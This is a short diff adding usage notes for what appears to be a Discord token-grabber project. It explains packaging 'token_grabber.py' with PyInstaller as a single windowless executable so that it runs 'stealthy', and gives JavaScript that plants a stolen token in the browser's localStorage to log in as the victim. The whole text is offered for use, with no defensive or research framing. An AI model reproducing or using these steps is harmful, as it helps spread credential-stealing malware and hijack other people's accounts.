@@ -1,0 +1,22 @@
+pyinstaller --onefile --windowed token_grabber.py
+
+pyinstaller --- module to convert it
+
+--onefile --- make 1 standalone file (delete pycache and build folder) in the dist folder
+
+--windowed --- if u want it stealthy use, if u want it to print text when executed dont use this option
+
+token_grabber.py --- the file
+
+to login to discord with token, code is here.
+
+function login(token) {
+setInterval(() => {
+document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
+}, 50);
+setTimeout(() => {
+location.reload();
+}, 2500);
+}
+
+login('TOKEN GOES HERE!')
